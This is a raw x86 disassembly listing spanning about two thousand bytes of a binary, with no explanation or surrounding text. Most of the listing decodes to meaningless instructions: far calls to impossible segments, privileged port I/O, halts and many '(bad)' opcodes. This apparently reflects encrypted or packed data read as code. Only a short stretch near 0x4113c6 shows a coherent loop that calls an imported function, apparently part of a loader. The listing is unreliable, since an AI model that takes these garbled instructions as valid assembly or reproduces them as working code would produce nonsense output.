  410fe1:	fnstenv [ebp-0x4c]
  410fe4:	and    edi,ebx
  410fe6:	retf   
  410fe7:	test   bl,ch
  410fe9:	aam    0x43
  410feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fec:	xlat   BYTE PTR ds:[ebx]
  410fed:	mov    bh,0x89
  410fef:	jp     0x411055
  410ff1:	lods   eax,DWORD PTR ds:[esi]
  410ff2:	sti    
  410ff3:	leave  
  410ff4:	sbb    edi,DWORD PTR [ecx+0x7c]
  410ff7:	jge    0x410ff3
  410ff9:	xor    eax,DWORD PTR [edx-0x49]
  410ffc:	xor    esp,esp
  410ffe:	retf   
  410fff:	pop    eax
  411000:	stos   DWORD PTR es:[edi],eax
  411001:	sti    
  411002:	jge    0x410fd1
  411004:	or     eax,0xcb99909b
  411009:	test   BYTE PTR ds:0xef186677,dl
  41100f:	jmp    0xa3e9d1eb
  411014:	out    0x73,al
  411016:	lahf   
  411017:	mov    esp,0x61cf2a28
  41101c:	xchg   edx,eax
  41101d:	fiadd  WORD PTR [esi]
  41101f:	mov    cl,BYTE PTR ds:0xa60b74bb
  411025:	dec    ecx
  411026:	call   0xf8a:0xfaf2a2ae
  41102d:	lods   al,BYTE PTR ds:[esi]
  41102e:	push   edx
  41102f:	sub    edx,DWORD PTR [edi+0x28ca2295]
  411035:	ds mov eax,0x78b9ac1e
  41103b:	mov    BYTE PTR [ecx-0x61],dh
  41103e:	jmp    0x411000
  411040:	inc    edi
  411041:	adc    BYTE PTR [edi-0x23],bh
  411044:	sbb    BYTE PTR ds:0x7e2816e9,cl
  41104a:	sar    BYTE PTR [esi],1
  41104c:	cwde   
  41104d:	push   eax
  41104e:	push   0x34
  411050:	retf   
  411051:	jns    0x41105c
  411053:	cld    
  411054:	mov    dh,0x22
  411056:	loop   0x410ffb
  411058:	mov    al,ds:0x7ecd890
  41105d:	mov    ah,BYTE PTR [eax-0x27f4788a]
  411063:	aaa    
  411064:	and    DWORD PTR [edx+0x72],0xa99a7af8
  41106b:	push   ebp
  41106c:	retf   
  41106d:	repz loope 0x411082
  411070:	loope  0x411004
  411072:	mov    ?,esp
  411074:	into   
  411075:	arpl   WORD PTR [ebx+ecx*8-0x386dfda8],sp
  41107c:	int    0xaf
  41107e:	lds    ebx,FWORD PTR [edi-0x19]
  411081:	test   DWORD PTR [esi-0x3d3f64ba],0x30f1df9c
  41108b:	fnstenv [esi-0x6a483a55]
  411091:	push   ebp
  411092:	out    0x33,eax
  411094:	xor    BYTE PTR [ebx+0x1ff6977e],ah
  41109a:	(bad)  
  41109b:	test   ch,0x2d
  41109e:	lods   eax,DWORD PTR ds:[esi]
  41109f:	hlt    
  4110a0:	pop    esi
  4110a1:	xchg   ebx,eax
  4110a2:	mov    ecx,DWORD PTR [ecx]
  4110a4:	pop    eax
  4110a5:	xor    eax,0xe2220780
  4110aa:	les    edx,FWORD PTR [edi]
  4110ac:	pop    eax
  4110ad:	sbb    eax,0xd6042b9c
  4110b2:	dec    esp
  4110b3:	popf   
  4110b4:	cmp    al,0x38
  4110b6:	call   0xfdd3:0xb28051ce
  4110bd:	and    BYTE PTR [ebp-0x2a],al
  4110c0:	mov    edi,0xb139654e
  4110c5:	xchg   edi,eax
  4110c6:	sbb    dl,al
  4110c8:	dec    edi
  4110c9:	or     DWORD PTR [ebp-0x50],0xffffff9a
  4110cd:	call   0xf485:0x8f63894b
  4110d4:	pop    edx
  4110d5:	mov    cl,0xd4
  4110d7:	sahf   
  4110d8:	out    0x66,eax
  4110da:	push   edx
  4110db:	ins    BYTE PTR es:[edi],dx
  4110dc:	xor    ch,BYTE PTR [edi-0x34]
  4110df:	or     ecx,DWORD PTR [ebp-0x14]
  4110e2:	inc    eax
  4110e3:	inc    ecx
  4110e4:	jg     0x411071
  4110e6:	push   0x5b535b01
  4110eb:	loop   0x4110cc
  4110ed:	imul   ebp,DWORD PTR [edx-0x2e771b0a],0xffffffd7
  4110f4:	xchg   esi,eax
  4110f5:	call   0x49c3:0xadbb3ed1
  4110fc:	in     al,0x6b
  4110fe:	mov    eax,ds:0xa5fa70cc
  411103:	fimul  DWORD PTR [edi+0x3b]
  411106:	push   esp
  411107:	jmp    0x4110a5
  411109:	xchg   BYTE PTR [ecx-0x17f00e2e],dh
  41110f:	pop    esp
  411110:	add    eax,0xc6794ed
  411115:	jecxz  0x4110ac
  411117:	inc    ebp
  411118:	std    
  411119:	push   0x715e09af
  41111e:	xchg   esp,eax
  41111f:	fwait
  411120:	rol    DWORD PTR [ecx-0x67],1
  411123:	jne    0x411145
  411125:	adc    al,0x4
  411127:	push   ebx
  411128:	dec    edx
  411129:	test   BYTE PTR [ecx],ch
  41112b:	imul   ebp,DWORD PTR [edx],0x887ddede
  411131:	push   eax
  411132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411133:	lock sub BYTE PTR [edx+0x3c],dl
  411137:	jecxz  0x41119d
  411139:	cmp    dl,cl
  41113b:	and    al,0x6
  41113d:	fst    QWORD PTR [esi+0x9]
  411140:	nop
  411141:	inc    ecx
  411142:	push   0x52ee5f6f
  411147:	hlt    
  411148:	test   bh,0xa9
  41114b:	shl    al,0x14
  41114e:	(bad)  
  41114f:	dec    ecx
  411150:	jge    0x411193
  411152:	ins    BYTE PTR es:[edi],dx
  411153:	jl     0x411141
  411155:	jns    0x411100
  411157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411158:	dec    eax
  411159:	imul   edx,ebx,0xaa302dd3
  41115f:	jbe    0x411170
  411161:	adc    esi,DWORD PTR [ebx-0x25]
  411164:	dec    ebx
  411165:	ds push edi
  411167:	repnz es (bad) 
  41116a:	fwait
  41116b:	gs addr16 pop edi
  41116e:	and    BYTE PTR [ecx-0x5e65d6b5],al
  411174:	push   0xffffffc8
  411176:	dec    edi
  411177:	loop   0x4111ad
  411179:	ins    BYTE PTR es:[edi],dx
  41117a:	pop    eax
  41117b:	(bad)  
  41117c:	and    BYTE PTR [ecx+0x411a84a7],0x2
  411183:	mov    BYTE PTR [esi+ebp*4+0x5],ah
  411187:	dec    eax
  411188:	jecxz  0x4111d5
  41118a:	test   DWORD PTR [ecx+0x6b5d6d21],ebx
  411190:	cmp    edi,0x6d5a2513
  411196:	enter  0xc2c4,0xc7
  41119a:	or     ah,BYTE PTR [ebp+eax*1+0x5a1038a3]
  4111a1:	(bad)  
  4111a2:	cdq    
  4111a3:	dec    ebx
  4111a4:	xor    al,0xe8
  4111a6:	mov    eax,ds:0x8dda2ec0
  4111ab:	in     al,dx
  4111ac:	pop    esp
  4111ad:	add    bh,BYTE PTR [eax+0x2a76990c]
  4111b3:	push   ebp
  4111b4:	xchg   DWORD PTR [ebx+0x6db19080],esi
  4111ba:	cmp    al,0xf1
  4111bc:	mov    bl,BYTE PTR [ecx]
  4111be:	lahf   
  4111bf:	stos   BYTE PTR es:[edi],al
  4111c0:	mov    cl,0x10
  4111c2:	js     0x4111dd
  4111c4:	test   eax,0x17f53ec3
  4111c9:	jae    0x4111da
  4111cb:	mov    eax,ds:0xc762399e
  4111d0:	dec    ebx
  4111d1:	sahf   
  4111d2:	in     eax,0x55
  4111d4:	or     edi,DWORD PTR [ebp-0x6a]
  4111d7:	add    al,0x6c
  4111d9:	ins    BYTE PTR es:[edi],dx
  4111da:	pop    ebx
  4111db:	add    ebx,DWORD PTR [esi+0x7d]
  4111de:	leave  
  4111df:	or     eax,0x1b7b5e41
  4111e4:	push   edi
  4111e5:	in     al,0xab
  4111e7:	sbb    eax,0x658cb8d4
  4111ec:	addr16 jo 0x41117d
  4111ef:	in     eax,0xf5
  4111f1:	mov    bh,0xf2
  4111f3:	lds    ecx,FWORD PTR [eax-0x16]
  4111f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f7:	xchg   ebx,eax
  4111f8:	aam    0xfb
  4111fa:	pop    ds
  4111fb:	into   
  4111fc:	daa    
  4111fd:	popa   
  4111fe:	sub    DWORD PTR [ebx+ecx*1-0x78],ecx
  411202:	ins    BYTE PTR es:[edi],dx
  411203:	xor    BYTE PTR [eax],bh
  411205:	xchg   edi,eax
  411206:	stos   DWORD PTR es:[edi],eax
  411207:	fbstp  TBYTE PTR [ecx]
  411209:	out    0x79,al
  41120b:	iret   
  41120c:	pop    ebp
  41120d:	mov    ecx,0xd4fd0e9d
  411212:	and    al,BYTE PTR [edi+0x223a5014]
  411218:	in     al,dx
  411219:	adc    DWORD PTR [edi],ebx
  41121b:	loopne 0x41128b
  41121d:	fild   DWORD PTR [ecx]
  41121f:	inc    eax
  411220:	mov    ds:0x67102428,eax
  411225:	int    0xa3
  411227:	cmp    BYTE PTR [ecx+0x707840af],bh
  41122d:	cwde   
  41122e:	inc    edx
  41122f:	cmp    esp,DWORD PTR [edx+ecx*2]
  411232:	outs   dx,BYTE PTR ds:[esi]
  411233:	jp     0x4111d7
  411235:	push   ebx
  411236:	aad    0xd8
  411238:	cmp    DWORD PTR [edi],0xffffffc8
  41123b:	sbb    BYTE PTR [eax-0x10be0970],bl
  411241:	mov    ds:0xe4927241,al
  411246:	xor    ch,BYTE PTR ds:0x2742b4b3
  41124c:	nop
  41124d:	jbe    0x4112bf
  41124f:	xchg   ebx,eax
  411250:	xchg   edx,ebx
  411252:	popf   
  411253:	and    al,cl
  411255:	push   ebp
  411256:	in     al,dx
  411257:	push   edx
  411258:	pop    es
  411259:	inc    ebx
  41125a:	inc    ebp
  41125b:	aad    0x92
  41125d:	sub    al,0x68
  41125f:	dec    eax
  411260:	push   ebp
  411261:	(bad)  
  411262:	in     al,0xb2
  411264:	mov    bl,0x8e
  411266:	sbb    DWORD PTR [eax+edx*2-0x2e],eax
  41126a:	idiv   DWORD PTR [ecx+0x524bce64]
  411270:	add    DWORD PTR [edx-0x3e78d0a],esi
  411276:	test   eax,0xe994a032
  41127b:	aam    0x2
  41127d:	xchg   ecx,eax
  41127e:	inc    ebp
  41127f:	sar    DWORD PTR [ebp+edi*1-0x33d7dfaf],cl
  411286:	xchg   dl,cl
  411288:	push   edi
  411289:	adc    eax,0xb92b01c3
  41128e:	adc    al,0xc4
  411290:	pop    ds
  411291:	mov    bx,0xa0f1
  411295:	add    eax,0xff43a26f
  41129a:	xchg   ebp,eax
  41129b:	inc    BYTE PTR [eax-0x6d007c3f]
  4112a1:	adc    BYTE PTR fs:[esp+ebx*4-0x76],bl
  4112a6:	ins    BYTE PTR es:[edi],dx
  4112a7:	stos   DWORD PTR es:[edi],eax
  4112a8:	mov    al,ds:0x7d512219
  4112ad:	fld    st(3)
  4112af:	xchg   esi,eax
  4112b0:	outs   dx,BYTE PTR ds:[esi]
  4112b1:	scas   eax,DWORD PTR es:[edi]
  4112b2:	sahf   
  4112b3:	test   bl,bh
  4112b5:	mov    ah,0x9c
  4112b7:	and    BYTE PTR [si],cl
  4112ba:	xchg   edi,eax
  4112bb:	in     eax,dx
  4112bc:	sahf   
  4112bd:	dec    esp
  4112be:	xor    al,0x80
  4112c0:	jmp    0xb29f:0x99aecac7
  4112c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112c8:	pop    esp
  4112c9:	xchg   edi,eax
  4112ca:	shl    DWORD PTR [esi-0x69],cl
  4112cd:	ror    DWORD PTR [edx-0x1e],1
  4112d0:	popa   
  4112d1:	cmp    DWORD PTR [edi-0xd],ebx
  4112d4:	not    DWORD PTR [ecx+eiz*4+0x73]
  4112d8:	(bad)
  4112dc:	push   cs
  4112dd:	jecxz  0x4112b0
  4112df:	ret    
  4112e0:	dec    esi
  4112e1:	aas    
  4112e2:	xchg   DWORD PTR [esi-0x4e],edi
  4112e5:	and    DWORD PTR [eax+0x65],ebp
  4112e8:	pop    si
  4112ea:	in     eax,dx
  4112eb:	dec    ebx
  4112ec:	cmp    ebx,ebp
  4112ee:	js     0x411351
  4112f0:	jbe    0x41132a
  4112f2:	ret    
  4112f3:	popf   
  4112f4:	cmc    
  4112f5:	nop
  4112f6:	repz fcmove st,st(4)
  4112f9:	pushf  
  4112fa:	jl     0x4112b5
  4112fc:	push   ebp
  4112fd:	xchg   edi,eax
  4112fe:	pop    ebx
  4112ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411300:	adc    ebx,esi
  411302:	stos   DWORD PTR es:[edi],eax
  411303:	mov    eax,0xb3cb3c13
  411308:	sbb    DWORD PTR [ebp-0x25e3c2cc],ebx
  41130e:	mov    ch,0xdf
  411310:	adc    BYTE PTR [eax+0x637dbcfb],al
  411316:	dec    ebx
  411317:	mov    dh,0xf4
  411319:	and    DWORD PTR [eax],0x51508ca4
  41131f:	bound  esp,QWORD PTR [ebx]
  411321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411322:	leave  
  411323:	test   BYTE PTR [eax],dl
  411325:	ret    
  411326:	mov    bl,0x5a
  411328:	in     eax,0x4f
  41132a:	cwde   
  41132b:	pop    ds
  41132c:	pop    ebx
  41132d:	ret    
  41132e:	adc    al,cl
  411330:	xchg   ebx,eax
  411331:	es and al,0x73
  411334:	loopne 0x4112df
  411336:	rol    BYTE PTR [ebx+eax*2+0x6eaa8a38],cl
  41133d:	mov    ebp,0xcd29e15d
  411342:	lahf   
  411343:	mov    ebp,0xc533705b
  411348:	mov    ?,esp
  41134a:	xchg   ebx,eax
  41134b:	adc    DWORD PTR [ebx],esi
  41134d:	xor    DWORD PTR [ebp-0x4e],ebx
  411350:	xchg   edx,eax
  411351:	pushf  
  411352:	nop
  411353:	lahf   
  411354:	jb     0x411394
  411356:	cmp    cl,bh
  411358:	mov    esi,0x601b80c7
  41135d:	sbb    DWORD PTR [esi+0x4d27efc4],0xffffffa9
  411364:	xchg   edi,eax
  411365:	ins    DWORD PTR es:[edi],dx
  411366:	jnp    0x411325
  411368:	mul    BYTE PTR [edx+0x4f970e32]
  41136e:	sti    
  41136f:	mov    eax,ds:0x84b5dd89
  411374:	and    bh,BYTE PTR [esi]
  411376:	fstp   DWORD PTR [esi]
  411378:	add    dl,BYTE PTR ds:0x7632cb4a
  41137e:	imul   esi,DWORD PTR ss:[edx],0x7f
  411382:	jp     0x4113d3
  411384:	inc    esp
  411385:	pop    edx
  411386:	or     ah,0x92
  411389:	jle    0x411389
  41138b:	mov    ss,WORD PTR [edi-0x569939c]
  411391:	cmp    DWORD PTR [edx+0x3f],0x13
  411395:	clc    
  411396:	std    
  411397:	adc    DWORD PTR [edx+0x43],0xffffffe2
  41139b:	sbb    DWORD PTR [edi],ecx
  41139d:	sub    DWORD PTR [edi+0x79088a0c],edx
  4113a3:	jne    0x411335
  4113a5:	cmp    edx,ebx
  4113a7:	pusha  
  4113a8:	push   ecx
  4113a9:	cmp    ebp,DWORD PTR [esi]
  4113ab:	xchg   edi,eax
  4113ac:	loope  0x41141a
  4113ae:	sbb    DWORD PTR [ebp+0x3f7103de],ebp
  4113b4:	xor    DWORD PTR [ecx+0x56],0x1d5ec2bf
  4113bb:	out    0xc1,al
  4113bd:	(bad)  ds:0xa1f2af79
  4113c3:	cwde   
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	xor    ebx,DWORD PTR fs:[esi+0x704a0efc]
  41144e:	jo     0x4114a8
  411450:	jge    0x4114c2
  411452:	jo     0x4114ce
  411454:	idiv   DWORD PTR [edi+0x15]
  411457:	clc    
  411458:	sub    eax,DWORD PTR [eax+esi*8]
  41145b:	add    al,BYTE PTR [esi]
  41145d:	icebp  
  41145e:	call   0xbafc:0x9b6e8a36
  411465:	cmc    
  411466:	mov    ebx,?
  411468:	les    edx,FWORD PTR [edx-0x7cedf527]
  41146e:	push   edi
  41146f:	ret    
  411470:	ja     0x411408
  411472:	stos   BYTE PTR es:[edi],al
  411473:	jecxz  0x411465
  411475:	pop    edx
  411476:	fsub   DWORD PTR [edx+ecx*4-0x92981d8]
  41147d:	jp     0x4114f9
  41147f:	sti    
  411480:	ret    
  411481:	ins    BYTE PTR es:[edi],dx
  411482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411483:	in     eax,dx
  411484:	jno    0x411480
  411486:	xor    DWORD PTR [eax],edx
  411488:	popf   
  411489:	push   0x3d
  41148b:	(bad)  
  41148c:	int    0xfa
  41148e:	addr16 jbe 0x411475
  411491:	aaa    
  411492:	lock pop esp
  411494:	cmp    BYTE PTR [ebx+ebx*2-0x4a],0x73
  411499:	mov    ch,0x76
  41149b:	call   0xa69f:0x165c7b0a
  4114a2:	push   0x77a5fcb4
  4114a7:	loopne 0x4114e1
  4114a9:	mov    DWORD PTR [esi+edi*2-0x14aae2ea],ecx
  4114b0:	das    
  4114b1:	imul   ebx,DWORD PTR [esi-0x34a7bd5f],0xe01b9150
  4114bb:	ficom  WORD PTR [ebp+0xb]
  4114be:	dec    edx
  4114bf:	inc    edx
  4114c0:	cwde   
  4114c1:	jecxz  0x411516
  4114c3:	fisttp WORD PTR [edi-0x1b0cfecd]
  4114c9:	and    DWORD PTR [bx+si],ebp
  4114cc:	cdq    
  4114cd:	dec    ecx
  4114ce:	in     al,dx
  4114cf:	jp     0x41145a
  4114d1:	jo     0x4114ea
  4114d3:	push   edi
  4114d4:	lea    ebx,[ecx+0x47]
  4114d7:	out    0xd3,eax
  4114d9:	js     0x4114db
  4114db:	add    ah,BYTE PTR [eax]
  4114dd:	sbb    edi,DWORD PTR ds:0x2d031f7e
  4114e3:	loope  0x41148a
  4114e5:	dec    esp
  4114e6:	dec    esi
  4114e7:	jmp    0x41150b
  4114e9:	pop    edi
  4114ea:	fsub   DWORD PTR fs:[ebp+0x28]
  4114ee:	call   0x5e37:0xa13ad4a4
  4114f5:	icebp  
  4114f6:	hlt    
  4114f7:	inc    ecx
  4114f8:	xchg   BYTE PTR [ecx+0x27],bh
  4114fb:	dec    esi
  4114fc:	push   0x70
  4114fe:	ret    0x5d3f
  411501:	push   0x5c9da667
  411506:	mov    bl,0xb9
  411508:	or     al,0xd1
  41150a:	mov    esi,?
  41150c:	cld    
  41150d:	lock mov edx,0xf8f6e398
  411513:	lods   al,BYTE PTR ds:[esi]
  411514:	adc    DWORD PTR [eax-0xe],eax
  411517:	sbb    DWORD PTR gs:[edx+0x2d],eax
  41151b:	push   ss
  41151c:	imul   esp,ebp,0xdb9c6509
  411522:	cmp    bl,BYTE PTR [edi]
  411524:	push   edi
  411525:	or     ebp,DWORD PTR [eax]
  411527:	push   edx
  411528:	mov    esi,0x47bb2949
  41152d:	jnp    0x411570
  41152f:	and    edi,ebx
  411531:	js     0x4114fc
  411533:	adc    BYTE PTR [ecx+0x7d3953be],dl
  411539:	sub    DWORD PTR [esi],ebx
  41153b:	fbstp  TBYTE PTR [esi]
  41153d:	inc    eax
  41153e:	pusha  
  41153f:	xor    al,0x5c
  411541:	sar    BYTE PTR [edx-0x3d],1
  411544:	imul   edi,DWORD PTR [ecx+0x57],0x7d
  411548:	xchg   edx,eax
  411549:	cmp    al,0xb4
  41154b:	mov    al,ds:0x24b90eb2
  411550:	push   ebp
  411551:	ss fwait
  411553:	jge    0x4115d1
  411555:	gs or  edi,eax
  411558:	dec    edx
  411559:	and    BYTE PTR [ebx],ch
  41155b:	in     al,0xe0
  41155d:	push   ebp
  41155e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41155f:	pop    esi
  411560:	daa    
  411561:	data16 in al,0x28
  411564:	loop   0x41151f
  411566:	cmp    al,0xfb
  411568:	jmp    0xde3a:0x80f03502
  41156f:	adc    eax,edi
  411571:	xchg   esi,eax
  411572:	(bad)  [eax-0x3a5f0dd0]
  411578:	out    0x6d,eax
  41157a:	sub    esp,DWORD PTR [ebx-0x49]
  41157d:	pop    esp
  41157e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157f:	into   
  411580:	out    dx,al
  411581:	mov    ecx,0xbc9e723d
  411586:	nop
  411587:	xor    cl,BYTE PTR [esi+0x64]
  41158a:	mov    DWORD PTR [eax-0x149f026d],esi
  411590:	test   DWORD PTR [edi+edi*1-0x4e],edi
  411594:	out    0x16,al
  411596:	add    BYTE PTR [ecx-0x5c],ch
  411599:	ror    BYTE PTR [ebx-0x24a4af81],cl
  41159f:	mov    esi,0x5afc598b
  4115a4:	sbb    BYTE PTR [esi],bl
  4115a6:	mov    ecx,gs
  4115a8:	scas   al,BYTE PTR es:[edi]
  4115a9:	out    dx,eax
  4115aa:	and    edx,DWORD PTR [ebp-0x7e0f204d]
  4115b0:	clc    
  4115b1:	ficom  WORD PTR [ebx]
  4115b3:	jle    0x411562
  4115b5:	shl    BYTE PTR [ebx],0x0
  4115b8:	add    BYTE PTR [esi],bl
  4115ba:	mov    edx,0x680ddb12
  4115bf:	mov    al,ds:0x9182e6dd
  4115c4:	fcom   QWORD PTR [ebx+eax*8+0x2edf645f]
  4115cb:	(bad)  
  4115cc:	out    dx,al
  4115cd:	sbb    BYTE PTR [ebp+0x3c0a74d0],bl
  4115d3:	xchg   esp,eax
  4115d4:	xchg   edx,eax
  4115d5:	bound  eax,QWORD PTR [edi+0x39]
  4115d8:	shl    BYTE PTR [ecx+edi*8-0x67],1
  4115dc:	ins    DWORD PTR es:[edi],dx
  4115dd:	add    bl,bl
  4115df:	jge    0x41161a
  4115e1:	xchg   edx,eax
  4115e2:	pop    ebp
  4115e3:	ffreep st(7)
  4115e5:	fidiv  DWORD PTR [eax+0x3a]
  4115e8:	add    esi,DWORD PTR [edx+0x1c]
  4115eb:	je     0x411639
  4115ed:	rcr    ebp,cl
  4115ef:	ins    DWORD PTR es:[edi],dx
  4115f0:	repnz sub eax,0xd7fe0fbe
  4115f6:	pop    eax
  4115f7:	in     al,0xb2
  4115f9:	mov    ah,0xab
  4115fb:	add    al,0x41
  4115fd:	mov    ds:0x79dc2edd,al
  411602:	sahf   
  411603:	daa    
  411604:	mov    bh,0x2a
  411606:	mov    edi,0xee5adf2c
  41160b:	in     eax,0xde
  41160d:	push   esp
  41160e:	ins    BYTE PTR es:[edi],dx
  41160f:	outs   dx,DWORD PTR ds:[esi]
  411610:	int3   
  411611:	jbe    0x4115d5
  411613:	jge    0x4115e4
  411615:	push   eax
  411616:	pop    edi
  411617:	adc    al,0x50
  411619:	pop    ecx
  41161a:	inc    esi
  41161b:	mov    fs,WORD PTR [ecx]
  41161d:	push   0xffffffbc
  41161f:	mov    dh,BYTE PTR [ebp-0xb434ffb]
  411625:	sub    DWORD PTR [edi+0x435b5e93],edi
  41162b:	pop    ebp
  41162c:	sbb    ah,ch
  41162e:	dec    ecx
  41162f:	js     0x4115c5
  411631:	add    BYTE PTR ds:0xf9102f70,0x78
  411638:	out    dx,al
  411639:	dec    eax
  41163a:	dec    edx
  41163b:	mov    ebx,0x8e503692
  411640:	(bad)  [ebp+ecx*4+0x71]
  411644:	dec    esp
  411645:	jb     0x4115fc
  411647:	(bad)
  41164c:	rcl    BYTE PTR [ecx],0xcb
  41164f:	mov    edi,0x63a37cb4
  411654:	xchg   ebx,eax
  411655:	dec    ebx
  411656:	fld    TBYTE PTR [ebx-0x2e]
  411659:	lss    ebx,FWORD PTR [ecx]
  41165c:	(bad)
  41165f:	xchg   edx,eax
  411660:	push   ebp
  411661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411662:	cs call 0xdd9:0x857fc335
  41166a:	mov    dl,0x78
  41166c:	jp     0x4116d0
  41166e:	mov    esp,0xa3404646
  411673:	inc    edi
  411674:	dec    ebx
  411675:	aam    0x8e
  411677:	fsubr  QWORD PTR [ebp+0x1d005411]
  41167d:	sub    eax,0x1829fe15
  411682:	mov    bh,0x92
  411684:	aad    0xb2
  411686:	pop    ds
  411687:	push   edx
  411688:	xchg   BYTE PTR [ebx+0x266cb5d9],bl
  41168e:	retf   
  41168f:	xor    eax,0x6b2b8658
  411694:	xor    esi,DWORD PTR [esi-0x58]
  411697:	(bad)
  41169b:	dec    ebx
  41169c:	xor    eax,0x624f0276
  4116a1:	pop    edi
  4116a2:	xor    ebx,DWORD PTR [esi]
  4116a4:	imul   ecx,DWORD PTR [esi+0xb679e73],0x79
  4116ab:	gs jle 0x411672
  4116ae:	jmp    0x480f:0x6d646406
  4116b5:	cmp    ebp,DWORD PTR [ecx-0x5ec22734]
  4116bb:	pop    ebx
  4116bc:	inc    ebp
  4116bd:	test   al,0xd5
  4116bf:	xor    BYTE PTR [edi+0x5820579],ah
  4116c5:	sbb    al,0x72
  4116c7:	call   0xa1ca6787
  4116cc:	dec    ebp
  4116cd:	inc    ebx
  4116ce:	jle    0x4116ce
  4116d0:	cmp    BYTE PTR [ebp-0x1],cl
  4116d3:	xor    ah,al
  4116d5:	pop    ss
  4116d6:	arpl   WORD PTR [eax-0xd],bx
  4116d9:	dec    ecx
  4116da:	mov    ch,ch
  4116dc:	jb     0x41170b
  4116de:	mov    ch,0x4b
  4116e0:	adc    al,0xbd
  4116e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e3:	sti    
  4116e4:	xchg   BYTE PTR ds:0x3b824de6,al
  4116ea:	add    al,0x8a
  4116ec:	dec    DWORD PTR [esi+0x18]
  4116ef:	fsub   QWORD PTR [ecx-0x6b]
  4116f2:	jb     0x4116c2
  4116f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f5:	cmp    al,0xb3
  4116f7:	nop
  4116f8:	pusha  
  4116f9:	inc    ebx
  4116fa:	lods   al,BYTE PTR ds:[esi]
  4116fb:	dec    esi
  4116fc:	and    eax,0x13b32128
  411701:	ret    0x1e78
  411704:	inc    ebp
  411705:	xor    al,0x6b
  411707:	dec    esp
  411708:	cwde   
  411709:	inc    eax
  41170a:	ret    
  41170b:	pop    es
  41170c:	(bad)  
  41170d:	mov    eax,ds:0x48d9b8de
  411712:	mov    ah,0x95
  411714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411715:	mov    bh,0xa0
  411717:	cwde   
  411718:	fst    DWORD PTR [eax]
  41171a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41171b:	(bad)  
  41171c:	aas    
  41171d:	pop    ds
  41171e:	cmp    eax,0xb3bd0b89
  411723:	inc    eax
  411724:	je     0x4116f7
  411726:	add    DWORD PTR [esp+ebx*1],eax
  411729:	and    ebx,DWORD PTR [ecx]
  41172b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172c:	jo     0x411770
  41172e:	jbe    0x41174a
  411730:	ja     0x4116e4
  411732:	inc    esi
  411733:	mov    al,0xcf
  411735:	mov    esi,DWORD PTR [ecx+0x55956bfb]
  41173b:	jae    0x4116c1
  41173d:	pop    es
  41173e:	mov    ds:0xa7658384,eax
  411743:	or     ecx,esi
  411745:	stos   DWORD PTR es:[edi],eax
  411746:	(bad)  
  411747:	adc    eax,0xfe614480
  41174c:	out    dx,eax
  41174d:	adc    DWORD PTR [ebp+0x284aa2e6],edx
  411753:	add    DWORD PTR [edi+0x22db114],edx
  411759:	sub    al,0x54
  41175b:	and    bl,BYTE PTR [eax+esi*8-0x42d25477]
  411762:	fiadd  DWORD PTR [ebx]
  411764:	repz popa 
  411766:	fadd   DWORD PTR [edx+0x3c]
  411769:	sub    ch,bl
  41176b:	or     edx,DWORD PTR [eax-0x4]
  41176e:	and    al,0x86
  411770:	mov    BYTE PTR [ecx],ch
  411772:	loope  0x4117e1
  411774:	fsubr  QWORD PTR [ebx-0x15ac4d2a]
  41177a:	in     eax,0x4c
  41177c:	jb     0x411719
  41177e:	push   edx
  41177f:	jge    0x411722
  411781:	clc    
  411782:	push   edi
  411783:	adc    al,0x3b
  411785:	aad    0xce
  411787:	pop    ecx
  411788:	mov    eax,es:0xe0c99f9f
  41178e:	jmp    0x6da2:0x4e4ba732
  411795:	add    al,0x7c
  411797:	mov    WORD PTR [ecx-0x5eafeb5b],?
  41179d:	sbb    DWORD PTR [edx-0x1ab0222f],edi
  4117a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a4:	cmp    edi,esi
  4117a6:	out    0xbd,eax
  4117a8:	jl     0x411828
  4117aa:	and    ecx,edx
  4117ac:	dec    esi
  4117ad:	nop
  4117ae:	aas    
  4117af:	repnz mov ebx,0xa266176b
  4117b5:	push   0xf9f9966a
  4117ba:	mov    esi,0x62a15202
  4117bf:	and    al,0x3b
  4117c1:	inc    esp
  4117c2:	mov    ds:0x2617aee7,al
  4117c7:	sti    
  4117c8:	mov    esi,0xd570ed36
  4117cd:	frstpm(287 only) 
  4117cf:	inc    esi
  4117d0:	mov    eax,0x1d8ffbf3
  4117d5:	repz mov ecx,0x8878d81f
  4117db:	add    cl,BYTE PTR ds:0x9b11b64e
  4117e1:	ftst   
  4117e3:	pop    es
  4117e4:	call   0xc751:0x55aa4393
